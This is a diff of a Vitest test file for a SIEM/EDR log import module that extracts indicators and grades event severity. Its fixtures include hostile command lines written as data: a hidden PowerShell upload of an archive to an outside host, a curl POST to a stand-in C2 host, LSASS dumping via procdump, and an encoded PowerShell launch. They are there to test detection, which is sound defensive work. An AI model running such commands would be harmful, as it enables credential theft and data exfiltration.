@@ -1,5 +1,16 @@
 import { describe, it, expect, afterEach } from "vitest";
-import { parseSiemExport, extractRecords, isSuspiciousCmd, cleanIp, textIocs, mergeRowIocs, resolveExtractedFrom, maxEventsDefault, logonRisk, type SiemIoc } from "../../src/analysis/siemImport.js";
+import {
+  parseSiemExport,
+  extractRecords,
+  isSuspiciousCmd,
+  cleanIp,
+  textIocs,
+  mergeRowIocs,
+  resolveExtractedFrom,
+  maxEventsDefault,
+  logonRisk,
+  type SiemIoc,
+} from "../../src/analysis/siemImport.js";
 
 // ── Representative Windows Event Log records (Elastic _source shape) ─────────────
 const LOGON_4624 = {
@@ -9,27 +20,50 @@ const LOGON_4624 = {
   computer_name: "WINDMILLDC.windmill.local",
   event_id: 4624,
   level: "Information",
-  event_data: { TargetUserName: "martin", TargetDomainName: "WINDMILL", LogonType: "3", IpAddress: "::ffff:10.10.200.11" },
+  event_data: {
+    TargetUserName: "martin",
+    TargetDomainName: "WINDMILL",
+    LogonType: "3",
+    IpAddress: "::ffff:10.10.200.11",
+  },
 };
 const FAILED_4625 = {
-  "@timestamp": "2017-03-20T06:40:00.000Z", log_name: "Security", computer_name: "WINDMILLDC",
-  event_id: 4625, level: "Information",
-  event_data: { TargetUserName: "admin", TargetDomainName: "WINDMILL", LogonType: "3", IpAddress: "10.10.200.50", Status: "0xc000006d" },
+  "@timestamp": "2017-03-20T06:40:00.000Z",
+  log_name: "Security",
+  computer_name: "WINDMILLDC",
+  event_id: 4625,
+  level: "Information",
+  event_data: {
+    TargetUserName: "admin",
+    TargetDomainName: "WINDMILL",
+    LogonType: "3",
+    IpAddress: "10.10.200.50",
+    Status: "0xc000006d",
+  },
 };
 const SVC_7045 = {
-  "@timestamp": "2017-03-20T10:00:00.000Z", log_name: "System", computer_name: "WINDMILLDC",
-  event_id: 7045, level: "Information",
+  "@timestamp": "2017-03-20T10:00:00.000Z",
+  log_name: "System",
+  computer_name: "WINDMILLDC",
+  event_id: 7045,
+  level: "Information",
   event_data: { ServiceName: "EvilSvc", ServiceFileName: "C:\\Windows\\Temp\\evil.exe" },
 };
 const SYSMON_PROC = {
   "@timestamp": "2017-03-20T09:46:58.001Z",
-  log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WINDMILLDC.windmill.local",
-  event_id: 1, level: "Information",
+  log_name: "Microsoft-Windows-Sysmon/Operational",
+  computer_name: "WINDMILLDC.windmill.local",
+  event_id: 1,
+  level: "Information",
   event_data: {
-    UtcTime: "2017-03-20 09:46:58.000", Image: "C:\\Windows\\System32\\taskeng.exe",
-    CommandLine: "taskeng.exe {GUID}", ParentImage: "C:\\Windows\\System32\\svchost.exe",
-    ParentCommandLine: "svchost.exe -k netsvcs", User: "NT AUTHORITY\\SYSTEM",
-    Hashes: "SHA1=6F6959BB113BACAF9D8336BA73F555D97A140085,MD5=7474098E40072B5C6C5D16B562AE81FF,SHA256=425A1A21A4DBC212C3C3DB5F8FECDD6235E7E7FE2FCFCE3AFFE3F9F80AA24A92,IMPHASH=C3B5EB32FB406506B162083DDB9FF480",
+    UtcTime: "2017-03-20 09:46:58.000",
+    Image: "C:\\Windows\\System32\\taskeng.exe",
+    CommandLine: "taskeng.exe {GUID}",
+    ParentImage: "C:\\Windows\\System32\\svchost.exe",
+    ParentCommandLine: "svchost.exe -k netsvcs",
+    User: "NT AUTHORITY\\SYSTEM",
+    Hashes:
+      "SHA1=6F6959BB113BACAF9D8336BA73F555D97A140085,MD5=7474098E40072B5C6C5D16B562AE81FF,SHA256=425A1A21A4DBC212C3C3DB5F8FECDD6235E7E7FE2FCFCE3AFFE3F9F80AA24A92,IMPHASH=C3B5EB32FB406506B162083DDB9FF480",
   },
 };
 
@@ -39,8 +73,11 @@ function elastic(...sources: object[]): string {
 
 // 4624 fixtures for the logon-type risk overlay.
 const logon4624 = (logonType: string, ip: string, user = "svc") => ({
-  "@timestamp": "2017-03-20T07:00:00.000Z", log_name: "Security", computer_name: "WINDMILLDC",
-  event_id: 4624, level: "Information",
+  "@timestamp": "2017-03-20T07:00:00.000Z",
+  log_name: "Security",
+  computer_name: "WINDMILLDC",
+  event_id: 4624,
+  level: "Information",
   event_data: { TargetUserName: user, TargetDomainName: "WINDMILL", LogonType: logonType, IpAddress: ip },
 });
 
@@ -112,7 +149,9 @@ describe("extractRecords — container unwrapping", () => {
     expect(records).toHaveLength(2);
   });
   it("reads NDJSON (one object per line, _source-wrapped)", () => {
-    const text = [JSON.stringify({ _source: LOGON_4624 }), JSON.stringify({ _source: FAILED_4625 })].join("\n");
+    const text = [JSON.stringify({ _source: LOGON_4624 }), JSON.stringify({ _source: FAILED_4625 })].join(
+      "\n",
+    );
     const { records, format } = extractRecords(text);
     expect(format).toBe("ndjson");
     expect(records).toHaveLength(2);
@@ -156,7 +195,7 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
   it("extracts IOCs: IP (unwrapping ::ffff:), SHA256 from the Sysmon Hashes string, process", () => {
     const r = parseSiemExport(elastic(LOGON_4624, SYSMON_PROC));
     const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
-    expect(vals).toContain("ip:10.10.200.11");                  // ::ffff: prefix stripped
+    expect(vals).toContain("ip:10.10.200.11"); // ::ffff: prefix stripped
     expect(vals).toContain("hash:425a1a21a4dbc212c3c3db5f8fecdd6235e7e7fe2fcfce3affe3f9f80aa24a92");
     expect(vals).toContain("process:taskeng.exe");
   });
@@ -164,18 +203,22 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
   it("scrapes URL / domain indicators embedded in a process command line (exfil / C2)", () => {
     const EXFIL = {
       "@timestamp": "2024-03-12T17:00:21.000Z",
-      log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "FS-01.meridiancpa.com",
-      event_id: 1, level: "Information",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "FS-01.meridiancpa.com",
+      event_id: 1,
+      level: "Information",
       event_data: {
-        UtcTime: "2024-03-12 17:00:21.000", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        CommandLine: "powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb-0312.zip",
+        UtcTime: "2024-03-12 17:00:21.000",
+        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        CommandLine:
+          "powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb-0312.zip",
         User: "MERIDIANCPA\\kevin.obrien",
       },
     };
     const r = parseSiemExport(elastic(EXFIL));
     const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
     expect(vals).toContain("url:https://mft.brightparcel.io/u/inbox"); // exfil URL now promoted to an IOC
-    expect(vals).toContain("domain:mft.brightparcel.io");             // …and its domain
+    expect(vals).toContain("domain:mft.brightparcel.io"); // …and its domain
   });
 
   it("carries the host as the affected asset and renders DOMAIN\\user for the asset graph", () => {
@@ -200,8 +243,15 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("bumps a LOLBin / suspicious command-line process-create above the benign Low", () => {
     const susp = {
-      "@timestamp": "2017-03-20T10:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 1, event_data: { Image: "C:\\Windows\\System32\\powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgA", ParentImage: "C:\\Office\\winword.exe" },
+      "@timestamp": "2017-03-20T10:01:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 1,
+      event_data: {
+        Image: "C:\\Windows\\System32\\powershell.exe",
+        CommandLine: "powershell -nop -w hidden -enc SQBFAFgA",
+        ParentImage: "C:\\Office\\winword.exe",
+      },
     };
     const r = parseSiemExport(elastic(susp));
     expect(["Medium", "High"]).toContain(r.events[0].severity);
@@ -209,41 +259,68 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("downgrades benign CreateRemoteThread (Sysmon EID 8) from csrss/wininit to Low", () => {
     const benign = {
-      "@timestamp": "2017-03-20T11:14:13Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 8, event_data: { SourceImage: "C:\\Windows\\System32\\csrss.exe", TargetImage: "C:\\Windows\\System32\\svchost.exe" },
+      "@timestamp": "2017-03-20T11:14:13Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 8,
+      event_data: {
+        SourceImage: "C:\\Windows\\System32\\csrss.exe",
+        TargetImage: "C:\\Windows\\System32\\svchost.exe",
+      },
     };
     const evil = {
-      "@timestamp": "2017-03-20T11:15:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 8, event_data: { SourceImage: "C:\\Temp\\loader.exe", TargetImage: "C:\\Windows\\System32\\explorer.exe" },
+      "@timestamp": "2017-03-20T11:15:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 8,
+      event_data: { SourceImage: "C:\\Temp\\loader.exe", TargetImage: "C:\\Windows\\System32\\explorer.exe" },
     };
     const r = parseSiemExport(elastic(benign, evil));
-    const byTarget = Object.fromEntries(r.events.map((e) => [e.description.match(/TargetImage=\S+\\(\S+)/)![1], e.severity]));
-    expect(byTarget["svchost.exe"]).toBe("Low");   // csrss source → benign
-    expect(byTarget["explorer.exe"]).toBe("High");  // unknown source → still flagged
+    const byTarget = Object.fromEntries(
+      r.events.map((e) => [e.description.match(/TargetImage=\S+\\(\S+)/)![1], e.severity]),
+    );
+    expect(byTarget["svchost.exe"]).toBe("Low"); // csrss source → benign
+    expect(byTarget["explorer.exe"]).toBe("High"); // unknown source → still flagged
   });
 
   it("downgrades benign Defender CreateRemoteThread (EID 8) to Low and drops T1055, but flags a masquerade", () => {
     const defender = {
-      "@timestamp": "2024-03-18T11:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 8, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe", TargetImage: "C:\\Windows\\explorer.exe" },
+      "@timestamp": "2024-03-18T11:00:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 8,
+      event_data: {
+        SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
+        TargetImage: "C:\\Windows\\explorer.exe",
+      },
     };
     const masq = {
-      "@timestamp": "2024-03-18T11:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 8, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\explorer.exe" },
+      "@timestamp": "2024-03-18T11:01:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 8,
+      event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\explorer.exe" },
     };
     const r = parseSiemExport(elastic(defender, masq));
     const def = r.events.find((e) => e.description.includes("MsMpEng.exe"))!;
     const mq = r.events.find((e) => e.description.includes("Public\\svchost.exe"))!;
     expect(def.severity).toBe("Low");
     expect(def.mitreTechniques).not.toContain("T1055");
-    expect(mq.severity).toBe("High");   // masqueraded name from \Users\Public\
+    expect(mq.severity).toBe("High"); // masqueraded name from \Users\Public\
     expect(mq.mitreTechniques).toContain("T1055");
   });
 
   it("flags LSASS process-access (Sysmon EID 10) as High with credential-dumping MITRE", () => {
     const lsass = {
-      "@timestamp": "2017-03-20T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 10, event_data: { SourceImage: "C:\\Temp\\mim.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
+      "@timestamp": "2017-03-20T10:02:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:\\Temp\\mim.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1410",
+      },
     };
     const r = parseSiemExport(elastic(lsass));
     expect(r.events[0].severity).toBe("High");
@@ -252,12 +329,26 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("downgrades benign LSASS access from Defender / core-OS processes to Low — #198", () => {
     const defender = {
-      "@timestamp": "2024-03-18T10:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 10, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2\\MsMpEng.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
+      "@timestamp": "2024-03-18T10:00:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2\\MsMpEng.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1410",
+      },
     };
     const svchost = {
-      "@timestamp": "2024-03-18T10:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 10, event_data: { SourceImage: "C:\\Windows\\System32\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1010" },
+      "@timestamp": "2024-03-18T10:01:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:\\Windows\\System32\\svchost.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1010",
+      },
     };
     const r = parseSiemExport(elastic(defender, svchost));
     for (const e of r.events) {
@@ -268,8 +359,15 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("still flags a MASQUERADED benign name running LSASS access from a suspicious path as High — #198", () => {
     const masq = {
-      "@timestamp": "2024-03-18T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
-      event_id: 10, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
+      "@timestamp": "2024-03-18T10:02:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:\\Users\\Public\\svchost.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1410",
+      },
     };
     const r = parseSiemExport(elastic(masq));
     expect(r.events[0].severity).toBe("High");
@@ -278,8 +376,15 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("grades a renamed LSASS dumper (by argument) as High — #199", () => {
     const dump = {
-      "@timestamp": "2024-03-18T15:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
-      event_id: 1, event_data: { Image: "C:\\Windows\\Temp\\wdi-svc.exe", CommandLine: "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp", ParentImage: "C:\\Windows\\explorer.exe" },
+      "@timestamp": "2024-03-18T15:24:38Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS-DEV-01",
+      event_id: 1,
+      event_data: {
+        Image: "C:\\Windows\\Temp\\wdi-svc.exe",
+        CommandLine: "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp",
+        ParentImage: "C:\\Windows\\explorer.exe",
+      },
     };
     const r = parseSiemExport(elastic(dump));
     expect(r.events[0].severity).toBe("High");
@@ -288,8 +393,15 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("bumps execution from a user-writable path (AppData) above benign Low — #199", () => {
     const dropper = {
-      "@timestamp": "2024-03-18T14:17:07Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
-      event_id: 1, event_data: { Image: "C:\\Users\\marcus.chen\\AppData\\Roaming\\Microsoft\\Libs\\brsvc.exe", CommandLine: "brsvc.exe --svc", ParentImage: "C:\\Users\\marcus.chen\\Downloads\\BrowserPlugin_v3.1.exe" },
+      "@timestamp": "2024-03-18T14:17:07Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS-DEV-01",
+      event_id: 1,
+      event_data: {
+        Image: "C:\\Users\\marcus.chen\\AppData\\Roaming\\Microsoft\\Libs\\brsvc.exe",
+        CommandLine: "brsvc.exe --svc",
+        ParentImage: "C:\\Users\\marcus.chen\\Downloads\\BrowserPlugin_v3.1.exe",
+      },
     };
     const r = parseSiemExport(elastic(dropper));
     expect(r.events[0].severity).toBe("Medium");
@@ -297,8 +409,15 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
   it("does NOT over-grade a benign system-path recon command — #199", () => {
     const recon = {
-      "@timestamp": "2024-03-18T14:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
-      event_id: 1, event_data: { Image: "C:\\Windows\\System32\\whoami.exe", CommandLine: "whoami /all", ParentImage: "C:\\Windows\\System32\\cmd.exe" },
+      "@timestamp": "2024-03-18T14:24:38Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS-DEV-01",
+      event_id: 1,
+      event_data: {
+        Image: "C:\\Windows\\System32\\whoami.exe",
+        CommandLine: "whoami /all",
+        ParentImage: "C:\\Windows\\System32\\cmd.exe",
+      },
     };
     const r = parseSiemExport(elastic(recon));
     expect(["Info", "Low"]).toContain(r.events[0].severity);
@@ -307,9 +426,19 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
 
 describe("parseSiemExport — Kerberoasting / AS-REP roasting (RC4 ticket verdict)", () => {
   const roast4769 = (service: string, enc: string) => ({
-    "@timestamp": "2024-05-01T12:00:00Z", log_name: "Security", computer_name: "DC01.corp.local",
-    event_id: 4769, level: "Information",
-    event_data: { TargetUserName: "attacker@CORP.LOCAL", ServiceName: service, TicketEncryptionType: enc, TicketOptions: "0x40810000", Status: "0x0", IpAddress: "10.0.0.66" },
+    "@timestamp": "2024-05-01T12:00:00Z",
+    log_name: "Security",
+    computer_name: "DC01.corp.local",
+    event_id: 4769,
+    level: "Information",
+    event_data: {
+      TargetUserName: "attacker@CORP.LOCAL",
+      ServiceName: service,
+      TicketEncryptionType: enc,
+      TicketOptions: "0x40810000",
+      Status: "0x0",
+      IpAddress: "10.0.0.66",
+    },
   });
 
   it("grades an RC4 (0x17) TGS-REQ for a user service account as Medium T1558.003", () => {
@@ -332,9 +461,18 @@ describe("parseSiemExport — Kerberoasting / AS-REP roasting (RC4 ticket verdic
 
   it("grades an RC4 AS-REQ with pre-auth disabled (PreAuthType 0) as Medium T1558.004", () => {
     const asrep = {
-      "@timestamp": "2024-05-01T12:05:00Z", log_name: "Security", computer_name: "DC01.corp.local",
-      event_id: 4768, level: "Information",
-      event_data: { TargetUserName: "svc_legacy", TargetDomainName: "CORP", TicketEncryptionType: "0x17", PreAuthType: "0", IpAddress: "10.0.0.66" },
+      "@timestamp": "2024-05-01T12:05:00Z",
+      log_name: "Security",
+      computer_name: "DC01.corp.local",
+      event_id: 4768,
+      level: "Information",
+      event_data: {
+        TargetUserName: "svc_legacy",
+        TargetDomainName: "CORP",
+        TicketEncryptionType: "0x17",
+        PreAuthType: "0",
+        IpAddress: "10.0.0.66",
+      },
     };
     const r = parseSiemExport(elastic(asrep));
     expect(r.events[0].severity).toBe("Medium");
@@ -343,9 +481,18 @@ describe("parseSiemExport — Kerberoasting / AS-REP roasting (RC4 ticket verdic
 
   it("leaves a normal RC4 AS-REQ (PreAuthType 2) as Low — RC4 on a real logon is too common to flag", () => {
     const normal = {
-      "@timestamp": "2024-05-01T12:06:00Z", log_name: "Security", computer_name: "DC01.corp.local",
-      event_id: 4768, level: "Information",
-      event_data: { TargetUserName: "alice", TargetDomainName: "CORP", TicketEncryptionType: "0x17", PreAuthType: "2", IpAddress: "10.0.0.20" },
+      "@timestamp": "2024-05-01T12:06:00Z",
+      log_name: "Security",
+      computer_name: "DC01.corp.local",
+      event_id: 4768,
+      level: "Information",
+      event_data: {
+        TargetUserName: "alice",
+        TargetDomainName: "CORP",
+        TicketEncryptionType: "0x17",
+        PreAuthType: "2",
+        IpAddress: "10.0.0.20",
+      },
     };
     const r = parseSiemExport(elastic(normal));
     expect(r.events[0].severity).toBe("Low");
@@ -353,12 +500,13 @@ describe("parseSiemExport — Kerberoasting / AS-REP roasting (RC4 ticket verdic
   });
 });
 
-describe("cleanIp — IPv6 shape validation (not just \"contains a colon\")", () => {
+describe('cleanIp — IPv6 shape validation (not just "contains a colon")', () => {
   it("rejects a free-text blob that merely contains colons as a bogus IPv6 IOC", () => {
     // A real observed case: a PowerShell cmdletization proxy-function dump (Get/Set-NetIPAddress
     // source) reached a field whose key loosely matched /ip|addr/i, and the old "v.includes(':')"
     // check accepted the WHOLE multi-KB blob as a "valid" IPv6 address.
-    const blob = "$__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)";
+    const blob =
+      "$__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)";
     expect(cleanIp(blob)).toBe("");
   });
   it("rejects other colon-bearing non-IP text (timestamps, ratios, URLs sans scheme)", () => {
@@ -367,21 +515,25 @@ describe("cleanIp — IPv6 shape validation (not just \"contains a colon\")", ()
     expect(cleanIp("C:\\Windows\\System32\\cmd.exe")).toBe("");
   });
   it("still accepts real IPv6 addresses, full and compressed forms", () => {
-    expect(cleanIp("2001:0db8:85a3:0000:0000:8a2e:0370:7334")).toBe("2001:0db8:85a3:0000:0000:8a2e:0370:7334");
+    expect(cleanIp("2001:0db8:85a3:0000:0000:8a2e:0370:7334")).toBe(
+      "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
+    );
     expect(cleanIp("2001:db8::8a2e:370:7334")).toBe("2001:db8::8a2e:370:7334");
-    expect(cleanIp("fe80::1")).toBe("");         // link-local excluded
-    expect(cleanIp("::")).toBe("");               // unspecified, in NOISE_IP
+    expect(cleanIp("fe80::1")).toBe(""); // link-local excluded
+    expect(cleanIp("::")).toBe(""); // unspecified, in NOISE_IP
   });
   it("still accepts IPv4 and strips the IPv4-mapped IPv6 prefix", () => {
     expect(cleanIp("10.0.0.5")).toBe("10.0.0.5");
     expect(cleanIp("::ffff:10.0.0.5")).toBe("10.0.0.5");
-    expect(cleanIp("127.0.0.1")).toBe("");         // loopback, in NOISE_IP
+    expect(cleanIp("127.0.0.1")).toBe(""); // loopback, in NOISE_IP
   });
 });
 
 describe("isSuspiciousCmd — #199 tradecraft grading", () => {
   it("strong: a renamed LSASS dumper identified by its arguments", () => {
-    expect(isSuspiciousCmd("C:\\Windows\\Temp\\wdi-svc.exe", "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp")).toBe("strong");
+    expect(
+      isSuspiciousCmd("C:\\Windows\\Temp\\wdi-svc.exe", "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp"),
+    ).toBe("strong");
     expect(isSuspiciousCmd("x.exe", "procdump64.exe -ma lsass.exe out.dmp")).toBe("strong");
   });
   it("weak: execution from a user-writable / staging path", () => {
@@ -391,8 +543,12 @@ describe("isSuspiciousCmd — #199 tradecraft grading", () => {
     expect(isSuspiciousCmd("C:\\ProgramData\\msidxsvc.exe", "msidxsvc.exe --svc")).toBe("weak");
   });
   it("weak: bulk DB dump + curl file upload (collection / exfil)", () => {
-    expect(isSuspiciousCmd("/usr/bin/mysqldump", "mysqldump -u app -psecret prod customers payment_methods")).toBe("weak");
-    expect(isSuspiciousCmd("/usr/bin/curl", "curl -X POST https://c2.example/api -F data=@/tmp/x.gz")).toBe("weak");
+    expect(
+      isSuspiciousCmd("/usr/bin/mysqldump", "mysqldump -u app -psecret prod customers payment_methods"),
+    ).toBe("weak");
+    expect(isSuspiciousCmd("/usr/bin/curl", "curl -X POST https://c2.example/api -F data=@/tmp/x.gz")).toBe(
+      "weak",
+    );
   });
   it("null: benign system binary running a benign command", () => {
     expect(isSuspiciousCmd("C:\\Windows\\System32\\whoami.exe", "whoami /all")).toBe(null);
@@ -403,12 +559,13 @@ describe("isSuspiciousCmd — #199 tradecraft grading", () => {
 describe("parseSiemExport — aggregation & volume", () => {
   it("collapses identical repetitive events into one counted row with a time range", () => {
     const copies = Array.from({ length: 5 }, (_, i) => ({
-      ...LOGON_4624, "@timestamp": `2017-03-20T06:4${i}:00.000Z`,
+      ...LOGON_4624,
+      "@timestamp": `2017-03-20T06:4${i}:00.000Z`,
     }));
     const r = parseSiemExport(elastic(...copies));
     expect(r.events).toHaveLength(1);
     expect(r.events[0].count).toBe(5);
-    expect(r.events[0].timestamp).toBe("2017-03-20T06:40:00.000Z");   // earliest
+    expect(r.events[0].timestamp).toBe("2017-03-20T06:40:00.000Z"); // earliest
     expect(r.events[0].endTimestamp).toBe("2017-03-20T06:44:00.000Z"); // latest
     expect(r.total).toBe(5);
     expect(r.groups).toBe(1);
@@ -422,14 +579,23 @@ describe("parseSiemExport — aggregation & volume", () => {
   });
 
   it("honors the maxEvents cap and reports dropped records", () => {
-    const distinct = Array.from({ length: 10 }, (_, i) => ({ ...LOGON_4624, event_data: { ...LOGON_4624.event_data, TargetUserName: `u${i}` } }));
+    const distinct = Array.from({ length: 10 }, (_, i) => ({
+      ...LOGON_4624,
+      event_data: { ...LOGON_4624.event_data, TargetUserName: `u${i}` },
+    }));
     const r = parseSiemExport(elastic(...distinct), { maxEvents: 3 });
     expect(r.events).toHaveLength(3);
     expect(r.dropped).toBe(7);
   });
 
   it("applies a minSeverity floor (drops Info-level logoff noise)", () => {
-    const logoff = { "@timestamp": "t", log_name: "Security", computer_name: "H", event_id: 4634, event_data: { TargetUserName: "x" } };
+    const logoff = {
+      "@timestamp": "t",
+      log_name: "Security",
+      computer_name: "H",
+      event_id: 4634,
+      event_data: { TargetUserName: "x" },
+    };
     const all = parseSiemExport(elastic(logoff, FAILED_4625));
     expect(all.events).toHaveLength(2);
     const floored = parseSiemExport(elastic(logoff, FAILED_4625), { minSeverity: "Low" });
@@ -440,9 +606,13 @@ describe("parseSiemExport — aggregation & volume", () => {
 describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
   it("maps an arbitrary EDR record using field auto-detection (time/host/severity/message)", () => {
     const edr = {
-      vendor: "CrowdStrike", "@timestamp": "2026-01-02T03:04:05Z", hostname: "LAPTOP-7",
-      severity: "high", message: "Suspicious PowerShell execution detected",
-      sha256: "a".repeat(64), dest_ip: "203.0.113.9",
+      vendor: "CrowdStrike",
+      "@timestamp": "2026-01-02T03:04:05Z",
+      hostname: "LAPTOP-7",
+      severity: "high",
+      message: "Suspicious PowerShell execution detected",
+      sha256: "a".repeat(64),
+      dest_ip: "203.0.113.9",
     };
     const r = parseSiemExport(JSON.stringify([edr]));
     expect(r.events).toHaveLength(1);
@@ -461,32 +631,37 @@ describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
     // An SSH auth line where the source IP lives INSIDE the message — no dedicated ip/src_ip field.
     // Without free-text scraping the IP shows in the timeline but never becomes an IOC.
     const ssh = {
-      "@timestamp": "2024-05-14T14:20:09.941Z", host: "PROXY-BO-01",
+      "@timestamp": "2024-05-14T14:20:09.941Z",
+      host: "PROXY-BO-01",
       message: "Failed password for svc_mgmt from 10.44.20.20 port 52310 on PROXY-BO-01",
     };
     const r = parseSiemExport(JSON.stringify([ssh]));
     const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
-    expect(vals).toContain("ip:10.44.20.20");   // internal RFC1918 source kept
+    expect(vals).toContain("ip:10.44.20.20"); // internal RFC1918 source kept
   });
 
   it("scrapes a URL/domain/hash from message text but skips internal .local hostnames", () => {
     const rec = {
-      "@timestamp": "2024-05-14T14:20:09.941Z", host: "WS-1",
+      "@timestamp": "2024-05-14T14:20:09.941Z",
+      host: "WS-1",
       message:
         "Download from http://evil.example.com/payload.bin sha256 " +
-        "b".repeat(64) + " observed on WS-MPATEL-01.northstar-branch.local",
+        "b".repeat(64) +
+        " observed on WS-MPATEL-01.northstar-branch.local",
     };
     const vals = parseSiemExport(JSON.stringify([rec])).iocs.map((i) => `${i.type}:${i.value}`);
     expect(vals).toContain("url:http://evil.example.com/payload.bin");
     expect(vals).toContain("domain:evil.example.com");
     expect(vals).toContain("hash:" + "b".repeat(64));
-    expect(vals.some((v) => v.includes(".local"))).toBe(false);   // AD hostname not flooded into IOCs
+    expect(vals.some((v) => v.includes(".local"))).toBe(false); // AD hostname not flooded into IOCs
   });
 
   it("does not create a domain IOC from a STRUCTURED hostname/fqdn column when it's an internal zone (.lan/.local/etc.) — same skip the free-text scraper already applies", () => {
     const rec = {
-      "@timestamp": "2024-05-14T14:20:09.941Z", message: "host telemetry",
-      hostname: "CLIENT01.lan", fqdn: "WIN10.corp.local",
+      "@timestamp": "2024-05-14T14:20:09.941Z",
+      message: "host telemetry",
+      hostname: "CLIENT01.lan",
+      fqdn: "WIN10.corp.local",
     };
     const vals = parseSiemExport(JSON.stringify([rec])).iocs.map((i) => `${i.type}:${i.value}`);
     expect(vals.some((v) => v.startsWith("domain:"))).toBe(false);
